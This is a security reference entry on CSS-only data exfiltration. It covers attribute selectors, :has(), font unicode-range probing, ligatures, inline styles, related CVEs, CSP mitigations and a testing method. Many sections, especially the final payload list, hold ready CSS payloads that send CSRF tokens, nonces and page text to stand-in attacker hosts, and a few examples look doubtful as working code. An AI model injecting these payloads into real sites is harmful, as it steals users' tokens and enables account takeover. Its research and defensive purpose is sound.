# 47 - CSS-Only Data Exfiltration Techniques

## Overview

CSS-based data exfiltration has matured from a theoretical curiosity into a practical attack class. These techniques bypass JavaScript-focused defenses (CSP `script-src`, Trusted Types) because stylesheets are often still permitted or less strictly controlled under `style-src`. This document catalogs all known CSS-only exfiltration vectors, including attribute selectors, the `:has()` pseudo-class, `@font-face` unicode-range probing, ligature-based text extraction, inline style exfiltration, and associated CVEs.

---

## 1. CSS Attribute Selector Exfiltration

### How It Works

CSS attribute selectors like `input[name="csrf"][value^="a"]` match elements with specific attribute value prefixes. When combined with `background-image: url(https://attacker.com/leak?prefix=a)`, the browser sends a request revealing each matched character. The attacker's server logs HTTP requests to reconstruct the full attribute value.

### Basic Technique

```css
/* Exfiltrate CSRF token character by character */
input[name="csrf"][value^="a"] { background: url(https://attacker.com/exfil?char=a); }
input[name="csrf"][value^="b"] { background: url(https://attacker.com/exfil?char=b); }
input[name="csrf"][value^="c"] { background: url(https://attacker.com/exfil?char=c); }
/* ... one rule per printable character per position ... */
/* After learning first char is 'a': */
input[name="csrf"][value^="aa"] { background: url(https://attacker.com/exfil?v=aa); }
input[name="csrf"][value^="ab"] { background: url(https://attacker.com/exfil?v=ab); }
/* Continue iteratively */
```

### Multi-Round via @import Chaining

The attack takes approximately ten seconds to extract a full token when `@import` chaining is used. Each round, the attacker's server dynamically generates CSS containing selectors targeted at the next character position based on previously leaked characters.

```css
/* Stage 1: injected in target page */
@import url('https://attacker.com/stage1.css');

/* Stage 1 response (dynamically generated): */
input[name="csrf"][value^="a"] { background: url(https://attacker.com/leak?pos=0&c=a); }
input[name="csrf"][value^="b"] { background: url(https://attacker.com/leak?pos=0&c=b); }
/* ... */
@import url('https://attacker.com/stage2.css');

/* Stage 2 response (after server learns first char from stage 1 callbacks): */
input[name="csrf"][value^="a3"] { background: url(https://attacker.com/leak?pos=1&c=3); }
/* ... continue for each position */
```

### Conditions Required

- CSS injection point (via `style-src 'unsafe-inline'`, injected `<style>` tag, or style attribute)
- Target element with sensitive data in attributes must be in the DOM
- `img-src` or `default-src` must allow the attacker's domain (or use `*`)
- Visible elements are needed for `background-image` to trigger (hidden inputs do NOT trigger loads)

**Source:** https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d
**Source:** https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token

---

## 2. The :has() Pseudo-Class Advancement

### The Problem It Solves

Prior to `:has()`, exfiltration from `<input type="hidden">` elements was impossible via CSS because hidden inputs do not render and therefore do not fetch `background-image` URLs. The `:has()` pseudo-class (supported in all major browsers since late 2023) removes this limitation.

### How It Works

`:has()` allows styling a parent or sibling element based on a child element's attributes. A visible parent element can be styled to load a background image when a hidden child matches a specific value:

```css
/* Exfiltrate hidden input value via parent element */
form:has(input[name="csrf"][value^="a"]) {
  background: url(https://attacker.com/leak?v=a);
}
form:has(input[name="csrf"][value^="b"]) {
  background: url(https://attacker.com/leak?v=b);
}
/* ... all characters ... */

/* Sibling-based exfiltration */
input[name="csrf"][value^="a"] ~ div {
  background: url(https://attacker.com/leak?v=a);
}
```

### Browser Support and Limitations

- Supported in Chrome 105+, Firefox 121+, Safari 15.4+, Edge 105+
- In both Chrome and Firefox, `input[type=hidden]` elements do not fetch background-image URLs -- `:has()` overcomes this by targeting visible ancestors
- The parent/ancestor element must be visible and have sufficient dimensions to trigger the background load

**Source:** https://portswigger.net/research/blind-css-exfiltration
**Source:** https://codesealer.com/blog/blind-css-exfiltration

---

## 3. @font-face unicode-range Probing

### How It Works

`@font-face` rules with `unicode-range` declarations cause the browser to fetch a font file only if the specified Unicode code points appear in text content on the page. An attacker defines one font per character of interest, each pointing to a unique URL on their server. The server logs reveal which characters are present in the target element.

### Basic Technique

```css
@font-face {
  font-family: probe_A;
  src: url(https://attacker.com/leak?char=A);
  unicode-range: U+0041;
}
@font-face {
  font-family: probe_B;
  src: url(https://attacker.com/leak?char=B);
  unicode-range: U+0042;
}
@font-face {
  font-family: probe_0;
  src: url(https://attacker.com/leak?char=0);
  unicode-range: U+0030;
}
@font-face {
  font-family: probe_1;
  src: url(https://attacker.com/leak?char=1);
  unicode-range: U+0031;
}
/* ... one @font-face per character of interest ... */

.target-element {
  font-family: probe_A, probe_B, probe_0, probe_1, /* ... */ sans-serif;
}
```

### Limitations

- Reveals which characters are present but NOT their order, frequency, or position
- Only works on text nodes (not attribute values)
- Requires `font-src` in CSP to allow the attacker's domain, or `font-src *`, or missing `font-src` with permissive `default-src`
- The target element must render text content (not hidden)

### Combining with Ligature-Based Detection

Unicode-range probing reveals the character set; ligature-based techniques (see section 4) can then determine character order. Together they enable full text reconstruction.

**Source:** https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html
**Source:** https://lists.w3.org/Archives/Public/public-css-archive/2020Oct/0073.html

---

## 4. Ligature-Based Text Exfiltration

### How It Works

Custom font ligatures can be crafted so that specific multi-character sequences (e.g., "csrf", "token", "pass") are rendered as a single wide glyph. By combining this with container overflow detection (scrollbar tricks or container query breakpoints), the attacker can determine which multi-character sequences appear in a text node. This overcomes the unicode-range limitation of not detecting character order.

### Technique

1. **Create a custom font** with ligature substitution rules (GSUB table) that map target character sequences to extremely wide glyphs
2. **Apply the font** to the target element via CSS injection
3. **Detect the width change** when a ligature matches:
   - Scrollbar detection: place the target in a fixed-width container; if a ligature matches, the wide glyph causes overflow and a scrollbar appears, which can be detected via additional CSS
   - Container query breakpoints (modern browsers): use `@container` queries to style based on the container width changing due to ligature rendering

### Example

```css
/* Custom font with ligatures for "csrf" -> extremely wide glyph */
@font-face {
  font-family: 'ligature-probe';
  src: url('https://attacker.com/fonts/csrf-ligature.woff2');
}

/* Apply to target element in a fixed-width container */
.target-container {
  width: 100px;
  overflow: auto;
}
.target-text {
  font-family: 'ligature-probe', monospace;
  white-space: nowrap;
}

/* If "csrf" appears -> ligature renders wide -> scrollbar appears */
/* Scrollbar appearance can trigger additional resource loads in some configurations */
```

### Limitations

- Requires crafting custom font files per target sequence
- Complex to automate for arbitrary text extraction
- Browser rendering and font shaping vary across engines
- Requires the target text to be in a visible, styled element

---

## 5. Inline Style Exfiltration

### How It Works

PortSwigger research demonstrates leaking attribute values through chained CSS conditionals even when the attacker is confined to injecting a `style` attribute rather than a full stylesheet. In Chromium-based browsers, a plain string (without `url()` syntax) can trigger a background request under certain conditions.

### Technique

When the injection point is a `style` attribute rather than a `<style>` block, the attack surface is more limited but still exploitable:

```html
<!-- Injection into style attribute -->
<div style="background:url(https://attacker.com/leak?context=true)">

<!-- Chained conditionals in style attribute (Chromium) -->
<div style="--x:expression(url('https://attacker.com/leak'))">
```

### Practical Considerations

- More constrained than full `<style>` tag injection
- Works primarily in Chromium-based browsers
- The injected style attribute must be on an element that is rendered (visible)
- Cannot use `@import`, `@font-face`, or other at-rules within inline styles

**Source:** https://portswigger.net/research/inline-style-exfiltration

---

## 6. CVE-2026-13790: Chrome Scroll-Based Side-Channel Leak

**CVE:** CVE-2026-13790
**Affected:** Chrome prior to version 150.0.7871.47
**CWE:** CWE-1300 (Improper Protection of Physical Side Channels)

A side-channel leak in Chrome's scroll handling allowed a remote attacker to leak cross-origin data via a crafted HTML page. The vulnerability relates to how scroll events and scroll-driven animations expose information about content dimensions that can be used to infer content values.

### Relevance to CSS Exfiltration

This CVE demonstrates that browser rendering mechanics (scroll position, container dimensions, animation timing) create side channels that can leak information about page content. The fix in Chrome 150.0.7871.47 addressed the specific scroll handling leak, but the general class of rendering side channels remains an active research area.

**Source:** https://app.opencve.io/cve/CVE-2026-13790

---

## 7. Historical: CVE-2019-17495 (Swagger UI CSS Injection)

**CVE:** CVE-2019-17495
**Affected:** Swagger UI

CSS-based input field value exfiltration in Swagger UI allowed exfiltration of CSRF tokens through custom CSS injection. This was one of the first widely documented real-world exploitations of CSS attribute selector exfiltration.

**Source:** https://launchpad.net/bugs/cve/CVE-2019-17495

---

## 8. Defense Bypass Considerations

### Why CSS Exfiltration Bypasses JavaScript Defenses

- **CSP `script-src`:** CSS exfiltration requires no JavaScript execution. Even `script-src 'none'` does not prevent it.
- **Trusted Types:** Only covers DOM XSS sinks (`innerHTML`, `eval`, etc.). CSS injection through `style` elements or attributes is not covered.
- **Subresource Integrity (SRI):** Only applies to `<script>` and `<link rel=stylesheet>` tags loading external resources. Inline styles and `@import` are not covered.

### CSP Directives That Can Mitigate

- `style-src 'self'` (no `'unsafe-inline'`): Prevents injected inline styles
- `img-src 'self'`: Limits background-image exfiltration destinations
- `font-src 'self'`: Limits @font-face probe destinations
- `default-src 'none'` with explicit allowlists: Blocks most exfiltration channels

### Limitations of CSP-Based Mitigation

Even with strict CSP:
- DNS prefetch exfiltration (`<link rel="dns-prefetch">`) is not controlled by CSP
- @font-face with `font-src` allowing any external domain enables unicode-range probing
- `img-src *` or overly broad `img-src` allows background-image exfiltration
- `style-src 'unsafe-inline'` (common for compatibility) enables all CSS exfiltration techniques

---

## 9. Testing Methodology

### Step 1: Identify CSS Injection Points

```
# Look for:
# - Reflected input in <style> tags
# - Reflected input in style="" attributes
# - CSS files loading user-controlled content
# - style-src 'unsafe-inline' in CSP
# - Template engines rendering user input in style contexts
```

### Step 2: Determine Exfiltrable Targets

```
# Look for sensitive data in:
# - Hidden input values (CSRF tokens, API keys)
# - Meta tag content attributes (nonces, tokens)
# - Data attributes on elements
# - Text content of sensitive elements
```

### Step 3: Select Technique

| Target Data | Location | Technique |
|-------------|----------|-----------|
| CSRF token | `<input type="hidden" value="...">` | `:has()` + attribute selectors |
| CSRF token | `<input type="text" value="...">` | Attribute selectors (direct) |
| CSP nonce | `<meta content="nonce-...">` | Attribute selectors on meta |
| CSP nonce | `<script nonce="...">` | Attribute selectors (Chrome hides nonce post-parse) |
| Text content | Visible element | @font-face unicode-range + ligatures |
| Any attribute | Any visible element | Attribute selectors + background-image |

### Step 4: Build Exfiltration Payload

```css
/* Template for attribute exfiltration */
TARGET_SELECTOR[ATTRIBUTE^="CHAR"] {
  background: url(https://attacker.com/leak?v=CHAR);
}

/* Template for :has()-based hidden input exfiltration */
PARENT:has(TARGET_SELECTOR[ATTRIBUTE^="CHAR"]) {
  background: url(https://attacker.com/leak?v=CHAR);
}

/* Template for unicode-range probing */
@font-face {
  font-family: probe;
  src: url(https://attacker.com/leak?c=CHAR);
  unicode-range: U+CODEPOINT;
}
.target { font-family: probe; }
```

---

## 10. Complete CSS Exfiltration Payload Reference

### P1: Direct Attribute Selector (visible inputs)
```css
input[name="csrf"][value^="a"]{background:url(https://evil.com/?v=a)}
input[name="csrf"][value^="b"]{background:url(https://evil.com/?v=b)}
```

### P2: :has() for Hidden Inputs
```css
form:has(input[type=hidden][name="csrf"][value^="a"]){background:url(https://evil.com/?v=a)}
form:has(input[type=hidden][name="csrf"][value^="b"]){background:url(https://evil.com/?v=b)}
```

### P3: Meta Tag Nonce Leak
```css
meta[content*="nonce-a"]{--x:url(https://evil.com/?n=a)}
meta[content*="nonce-b"]{--x:url(https://evil.com/?n=b)}
```

### P4: @font-face Unicode-Range Probe
```css
@font-face{font-family:p;src:url(https://evil.com/?c=a);unicode-range:U+61}
@font-face{font-family:p;src:url(https://evil.com/?c=b);unicode-range:U+62}
.target{font-family:p}
```

### P5: @import Chain (multi-round)
```css
@import url('https://evil.com/exfil/stage1.css');
```

### P6: Scrollbar-Based Content Detection
```css
.container{width:20px;overflow:auto}
.container::-webkit-scrollbar{background:url(https://evil.com/?overflow=true)}
.target{font-family:ligature-font;white-space:nowrap}
```

---

## References

- PortSwigger Blind CSS Exfiltration: https://portswigger.net/research/blind-css-exfiltration
- PortSwigger Inline Style Exfiltration: https://portswigger.net/research/inline-style-exfiltration
- Codesealer Blind CSS Exfiltration: https://codesealer.com/blog/blind-css-exfiltration
- InfoSec Write-ups CSS Injection: https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d
- Voorivex CSS Data Exfiltration OAuth Token: https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token
- mksben CSS unicode-range Attack: https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html
- W3C CSS Working Group Font Probing Discussion: https://lists.w3.org/Archives/Public/public-css-archive/2020Oct/0073.html
- CVE-2026-13790 (Chrome Scroll Side Channel): https://app.opencve.io/cve/CVE-2026-13790
- CVE-2019-17495 (Swagger UI CSS Injection): https://launchpad.net/bugs/cve/CVE-2019-17495
